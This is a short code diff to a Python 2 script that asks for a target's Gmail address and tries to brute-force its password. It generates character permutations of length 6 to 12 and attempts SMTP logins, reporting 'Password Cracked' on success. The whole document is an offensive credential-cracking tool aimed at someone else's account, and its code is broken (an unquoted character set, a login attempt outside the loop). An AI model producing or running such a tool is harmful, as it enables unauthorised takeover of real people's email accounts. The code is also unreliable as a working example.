@@ -10,12 +10,11 @@ user = raw_input("Enter Target's Gmail Address: ")
 def print_perms(chars, minlen, maxlen): 
    for n in range(6, 12+1): 
       for perm in itertools.product(abcdefghijklmnopqrstuvwxyz1234567890, repeat=n): 
-         if(''.join(perm) == symbols):
-            return 0
+         password = ''.join(perm)
 
 try: 
-    smtpserver.login(user, symbols) 
-    print "[+] Password Cracked: %s" % symbols 
+    smtpserver.login(user, password) 
+    print "[+] Password Cracked: %s" % password
     time.sleep(10)
 except smtplib.SMTPAuthenticationError: 
-    print "[!] Password Inccorect: %s" % symbols
+    print "[!] Password Inccorect: %s" % password
